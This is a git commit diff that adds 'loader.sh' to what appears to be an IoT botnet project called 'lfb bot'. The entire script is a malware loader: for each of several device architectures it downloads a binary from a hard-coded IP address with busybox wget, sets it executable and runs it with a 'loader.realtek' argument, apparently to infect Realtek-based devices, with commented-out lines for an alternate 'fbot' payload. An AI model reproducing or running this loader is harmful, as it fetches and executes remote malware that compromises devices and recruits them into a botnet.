60d1e2097f1bd6721829ff950483c05ca9cdaa0d
Dayton Dekam <daytondekam@Daytons-MacBook-Pro.local>
2021-10-13 21:10:33 -0700

    lfb bot added

---
+++ lfb_bot/loader.sh
@@ -0,0 +1,14 @@
+n='mpsl mips arm arm7 sh4'
+http_server='45.61.188.184'
+
+for a in $n
+do
+        cat $SHELL > .b
+        >.b
+        busybox wget http://$http_server/.bom/b.$a -O- > .b
+ #       busybox wget http://$http_server/.bu/fbot.$a -O- > .s
+        chmod 777 .b
+#       chmod 777 .s
+        ./.b loader.realtek
+#       ./.s loader.realtek
+done
